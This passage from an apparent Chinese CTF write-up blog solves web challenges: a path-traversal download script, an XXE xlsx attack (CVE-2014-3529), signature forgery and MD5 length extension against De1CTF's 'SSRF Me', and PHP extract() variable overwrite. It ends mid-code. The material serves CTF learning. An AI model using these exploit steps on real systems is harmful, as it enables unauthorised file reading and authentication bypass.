class="hljs-keyword">import</span> requests<br>classname = <span class="hljs-string">&quot;DownloadSerlet&quot;</span><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28032/file_in_java/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(classname)<br>params = &#123;<br>    <span class="hljs-string">&quot;filename&quot;</span>:<span class="hljs-string">&quot;../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/classes/cn/abc/servlet/&#123;&#125;.class&quot;</span>.<span class="hljs-built_in">format</span>(classname)<br>&#125;<br><br>r = requests.get(url=url,params=params)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Download.class&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(r.content)<br></code></pre></td></tr></table></figure><p>拿到之后用<code>jd-gui</code>反编译，康康源代码，发现在<code>upload</code>的地方解析了xlsx文件，可以考虑是不是CVE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>   String savePath = getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>   String tempPath = getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/temp&quot;</span>);<br>   File tempFile = <span class="hljs-keyword">new</span> File(tempPath);<br>   <span class="hljs-keyword">if</span> (!tempFile.exists())<br>     tempFile.mkdir(); <br>   String message = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">try</span> &#123;<br>     DiskFileItemFactory factory = <span class="hljs-keyword">new</span> DiskFileItemFactory();<br>     factory.setSizeThreshold(<span class="hljs-number">102400</span>);<br>     factory.setRepository(tempFile);<br>     ServletFileUpload upload = <span class="hljs-keyword">new</span> ServletFileUpload((FileItemFactory)factory);<br>     upload.setHeaderEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>     upload.setFileSizeMax(<span class="hljs-number">1048576L</span>);<br>     upload.setSizeMax(<span class="hljs-number">10485760L</span>);<br>     <span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request))<br>       <span class="hljs-keyword">return</span>; <br>     List&lt;FileItem&gt; list = upload.parseRequest(request);<br>     <span class="hljs-keyword">for</span> (FileItem fileItem : list) &#123;<br>       <span class="hljs-keyword">if</span> (fileItem.isFormField()) &#123;<br>         String name = fileItem.getFieldName();<br>         String str = fileItem.getString(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>         <span class="hljs-keyword">continue</span>;<br>       &#125; <br>       String filename = fileItem.getName();<br>       <span class="hljs-keyword">if</span> (filename == <span class="hljs-keyword">null</span> || filename.trim().equals(<span class="hljs-string">&quot;&quot;</span>))<br>         <span class="hljs-keyword">continue</span>; <br>       String fileExtName = filename.substring(filename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>       InputStream in = fileItem.getInputStream();<br>       <span class="hljs-comment">//注意看这里***************************************************</span><br>       <span class="hljs-keyword">if</span> (filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>) &amp;&amp; <span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName))<br>         <span class="hljs-keyword">try</span> &#123;<br>           Workbook wb1 = WorkbookFactory.create(in);<br>           Sheet sheet = wb1.getSheetAt(<span class="hljs-number">0</span>);<br>           System.out.println(sheet.getFirstRowNum());<br>         &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e) &#123;<br>           System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>           e.printStackTrace();<br>         &#125;  <br>       String saveFilename = makeFileName(filename);<br>       request.setAttribute(<span class="hljs-string">&quot;saveFilename&quot;</span>, saveFilename);<br>       request.setAttribute(<span class="hljs-string">&quot;filename&quot;</span>, filename);<br>       String realSavePath = makePath(saveFilename, savePath);<br>       FileOutputStream out = <span class="hljs-keyword">new</span> FileOutputStream(realSavePath + <span class="hljs-string">&quot;/&quot;</span> + saveFilename);<br>       <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>       <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">while</span> ((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>)<br>         out.write(buffer, <span class="hljs-number">0</span>, len); <br>       in.close();<br>       out.close();<br>       message = <span class="hljs-string">&quot;;</span><br><span class="hljs-string">     &#125; </span><br><span class="hljs-string">   &#125; catch (FileUploadException e) &#123;</span><br><span class="hljs-string">     e.printStackTrace();</span><br><span class="hljs-string">   &#125; </span><br><span class="hljs-string">   request.setAttribute(&quot;</span>message<span class="hljs-string">&quot;, message);</span><br><span class="hljs-string">   request.getRequestDispatcher(&quot;</span>/ListFileServlet<span class="hljs-string">&quot;).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="hljs-string"> &#125;</span><br></code></pre></td></tr></table></figure><p><a href="https://cloud.tencent.com/developer/article/1668912">CVE-2014-3529</a></p><p>接下来就是制作存在XXE的xlsx文件，直接读取<code>/flag</code>（之前在任意读取时，测试发现这个文件被ban掉了）</p><p>制作的时候需要注意，xlsx改后缀为zip文件后，直接用winrar打开后在内部修改，解压后再压缩可能出现问题。</p><p>最后打出flag。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816152852215.png" alt="image-20220816152852215" /></p><h2 id="代码审计">6、代码审计</h2><h3 id="de1ctf-2019ssrf-me代码审计哈希扩展攻击">1、[De1ctf 2019]SSRF Me（代码审计/哈希扩展攻击）</h3><p>首先看源代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><span class="hljs-comment"># import importlib</span><br><br><br><span class="hljs-comment"># importlib.</span><br><span class="hljs-comment"># reload(sys)</span><br><span class="hljs-comment"># sys.setdefaultencoding(&#x27;latin1&#x27;)</span><br><br>app = Flask(__name__)<br><br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):          <span class="hljs-comment">#SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span>(<span class="hljs-params">self</span>):</span><br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()): <span class="hljs-comment"># 校验hash</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<span class="hljs-comment"># 读取url内容，存储到文件中</span><br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<span class="hljs-comment"># 读取文件内容</span><br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span>(<span class="hljs-params">self</span>):</span><span class="hljs-comment"># 校验签名</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 生成签名</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-comment"># 实现SSRF的关键点</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world!&quot;</span><br><br><span class="hljs-comment"># 访问对应param的内容</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">param</span>):</span><br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-comment"># 计算签名</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span>(<span class="hljs-params">action, param</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">content</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">param</span>):</span><br>    check=param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,port=<span class="hljs-number">7781</span>)<br></code></pre></td></tr></table></figure><p>首先阅读源代码之后，我们能够梳理出大致逻辑</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs fortran">geneSign -&gt; 生成签名（param自选，<span class="hljs-keyword">action</span>=<span class="hljs-built_in">scan</span>）<br>校验签名 -&gt; 将上传的签名和计算的签名（param自选，<span class="hljs-keyword">action</span>自选）<br><span class="hljs-built_in">scan</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">action</span> -&gt; 访问并读取到文件中<br>read <span class="hljs-keyword">in</span> <span class="hljs-keyword">action</span> -&gt; 读取文件<br></code></pre></td></tr></table></figure><h4 id="解法一字符串拼接">解法一、字符串拼接</h4><p>审计下来，发现代码中比较可疑的点在于scan 和 read 的判断是<code>in action</code>，并且两者是独立的分支结构。</p><p>同时签名验证的核心其实是</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">key + para<span class="hljs-name">m0</span> + <span class="hljs-string">&#x27;scan&#x27;</span> = key + para<span class="hljs-name">m1</span> + actio<span class="hljs-symbol">n1</span><br></code></pre></td></tr></table></figure><p>那么，我们可以构造</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">param0</span> = flag.txtread<br><br><span class="hljs-attr">param1</span> = flag.txt<br><span class="hljs-attr">action1</span> = readscan<br></code></pre></td></tr></table></figure><p>这样我们就成功地实现了read的功能，最后得到flag。</p><h4 id="解法二哈希扩展攻击">解法二、哈希扩展攻击</h4><p>推荐阅读博客：</p><p><a href="https://joychou.org/web/hash-length-extension-attack.html">md5 hash attack</a></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018005050116.png" alt="image-20221018005050116" style="zoom: 67%;" /></p><p>如果有了这样的攻击手段，那我们就可以在不知道secret_key的情况下，把read加入我们的sign中，也能实现攻击。</p><p>需要注意的是此处必须是salt + message，如果顺序颠倒，则无法实现md5hash扩展攻击。</p><p>利用现成的脚本:</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">28 </span>= <span class="hljs-keyword">len</span>(secret_key) + <span class="hljs-keyword">len</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>) + <span class="hljs-keyword">len</span>(<span class="hljs-string">&quot;read&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011057035.png" alt="image-20221018011057035" /></p><p>将生成的结果注入，注意要在action前面加上scan</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">param</span>=flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011220758.png" alt="image-20221018011220758" /></p><h3 id="gfctf-baby_web变量覆盖">2、GFCTF-Baby_Web（变量覆盖）</h3><p>这道题主要考察PHP源码审计的能力，当然要想做出来这道题，还是需要一些额外的技巧。</p><p><code>F12</code>发现源代码，暗示存在路径穿越。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome To GFCTF 12th!!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-comment">&lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt;</span><br></code></pre></td></tr></table></figure><p>这也没有可以注入的参数，于是先dirsearch扫一下，直接扫出来了</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/blog0013-0001.png" alt="blog0013_0001" style="zoom:80%;" /></p><p>直接上BP</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/blog0013_0002.png" alt="blog0013_0002" style="zoom: 50%;" /></p><p>于是把源代码扒下来，接下来就是变量覆盖的事了。</p><p>先看文件包含这一块：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>defined(<span class="hljs-string">&#x27;main&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Temp</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$date</span>=[<span class="hljs-string">&#x27;version&#x27;</span>=&gt;<span class="hljs-string">&#x27;1.0&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>=&gt;<span class="hljs-string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$template</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;date = array_merge(<span class="hljs-keyword">$this</span>-&gt;date,<span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTempName</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$dir</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;template = str_replace(<span class="hljs-string">&#x27;..&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;./template/admin/&#x27;</span>.<span class="hljs-variable">$template</span>);<br>            <span class="hljs-keyword">if</span>(!is_file(<span class="hljs-keyword">$this</span>-&gt;template))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;template = <span class="hljs-string">&#x27;./template/index.html&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        extract(<span class="hljs-keyword">$this</span>-&gt;date);<span class="hljs-comment">//文件包含入口</span><br>        <span class="hljs-keyword">$this</span>-&gt;getTempName(<span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>);<br>        <span class="hljs-keyword">include</span>(<span class="hljs-keyword">$this</span>-&gt;template);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单理解就是，我们需要有<code>$space</code>变量，才能完成文件包含，于是我们直接POST上去，由于<code>extract</code>的作用，实现了变量覆盖，使得文件<code>/templace/admin/index.html</code>能够被包含。</p><p>于是走到最后一步：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;listdata(<span class="hljs-string">&quot;action=list module=<span class="hljs-subst">$mod</span>&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对应的后端源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listdata</span>(<span class="hljs-params"><span class="hljs-variable">$_params</span></span>)</span>&#123;<br>       <span class="hljs-variable">$system</span> = [<br>           <span class="hljs-string">&#x27;db&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;app&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;num&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;sum&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;form&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;page&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;site&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;not_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;show_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;more&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;catid&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;field&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;order&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;space&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;table&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;table_site&#x27;</span> =&gt; <span 